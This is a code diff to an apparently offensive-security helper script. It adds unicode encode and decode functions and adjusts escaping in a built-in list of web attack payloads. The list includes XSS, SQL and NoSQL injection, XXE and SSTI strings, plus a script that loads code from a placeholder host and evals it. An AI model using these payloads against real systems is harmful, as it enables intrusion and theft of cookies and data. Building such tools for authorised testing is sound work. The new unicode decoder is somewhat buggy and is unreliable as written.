@@ -61,6 +61,19 @@ class Decode:
                 #out += r'\x{0:02x}'.format(ord(char))
         return out
 
+    def unicode(self, user_in):
+        out = ""
+        
+        for ch in user_in.split(r"\u")[1:]:    
+            char_code = ""
+            if ch[0] == '0':
+                char_code = ch[1:]
+            if ch[1] == '0':
+                char_code = ch[2:]
+
+            out += chr(int(char_code,16))
+        return out
+
 class Encode:
     def b32(self, user_in):
         return base64.b32encode(user_in).decode("utf-8")
@@ -95,12 +108,18 @@ class Encode:
             return F"Input was: {type(user_in)}, but type int is required!\nError: {e}"
 
     def hexweb(self, user_in):
-        prepend=r"\x"
+        prepend = r"\x"
         data = self.hex(user_in).strip("0x")
         # for 2entries in data, add \x and make one string
         split = [data[i:i+2] for i in range(0,len(data), 2)]
         res = "".join([F"{prepend}{ent}" for ent in split])
         return res
+
+    def unicode(self, user_in):
+        out = ""
+        for ch in user_in:
+            out += rf"\u{ord(ch):04x}"
+        return out
 
 class Analyze:
     def parquet(self, user_in):
@@ -115,7 +134,7 @@ class Payload:
     placeholder = "|placeholder|"
     payloads = [
         # basic
-        '<s> hi {*hi*} {{ 7*7 }} ${7*7} ${{<%[%\'\"}}%\.',
+        r'<s> hi {*hi*} {{ 7*7 }} ${7*7} ${{<%[%\'"}}%\.',
         # js
         "<img src=x onerror=alert(document.domain) />",
         "<script>console.log('Domain: ' + document.domain + 'Origin: ' + window.origin))</script>",
@@ -129,7 +148,7 @@ class Payload:
         "1' or 1=1",
         "1\" or 1=1",
         # NoSQL
-        '{"username": {"$ne": null}, "password": {"$ne": null}}',
+        r'{"username": {"$ne": null}, "password": {"$ne": null}}',
         "true, $where: '1 == 1'",
         # XXE
         "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example 'Doe'> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>\n",
@@ -141,7 +160,7 @@ class Payload:
         F"<script>let d=new XMLHttpRequest();d.open(\"GET\",\"{placeholder}\");d.send()</script>",
         F"$.get({placeholder})",
         F"fetch({placeholder})",
-        F"<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\GET\, \"//{placeholder}\");a.send();",
+        F"<script>function b(){{{{eval(this.responseText)}}}};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\GET\, \"//{placeholder}\");a.send();",
         "[a](javascript:prompt(document.cookie)) - Markdown",
         # SSTI
         "${"+placeholder+"}",
@@ -253,6 +272,8 @@ if __name__ == "__main__":
             res = enc.hexint(args.hexint[0])
         if args.hexweb:
             res = enc.hexweb(args.hexweb[0])
+        if args.unicode:
+            res = enc.unicode(args.unicode[0])
 
     if func == "decode":
         if args.b32:
@@ -271,6 +292,8 @@ if __name__ == "__main__":
             res = dc.hexint(args.hexint[0])
         if args.hexweb:
             res = dc.hexweb(args.hexweb[0])
+        if args.unicode:
+            res = dc.unicode(args.unicode[0])
 
     if func == "payload":
         if args.list:
